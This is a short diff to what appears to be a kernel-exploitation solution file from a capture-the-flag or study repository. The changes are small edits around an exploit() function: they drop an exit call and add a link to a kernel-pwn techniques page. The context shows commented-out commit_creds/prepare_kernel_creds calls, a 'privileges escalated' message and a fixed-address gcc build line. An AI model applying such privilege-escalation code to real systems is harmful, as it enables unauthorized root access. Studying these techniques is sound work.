@@ -116,8 +116,7 @@ void exploit() {
         // "bl prepare_kernel_creds\n"
         // "bl commit_creds\n"
     );
-    puts("[+] privileges escaleted");
-    exit(0);        
+    puts("[+] privileges escaleted");    
 }
 
 int main(int argc, char *argv[]) {
@@ -134,6 +133,7 @@ int main(int argc, char *argv[]) {
     // triger hook
     exploit();
     // syscall(EXPLOIT);
+    
     return 0;
 }
 
@@ -141,3 +141,6 @@ int main(int argc, char *argv[]) {
 gcc -Wl,--section-start=.text=0x1030110 sol.c -o sol
 */
 ```
+
+technique
+https://github.com/smallkirby/kernelpwn/tree/master/technique
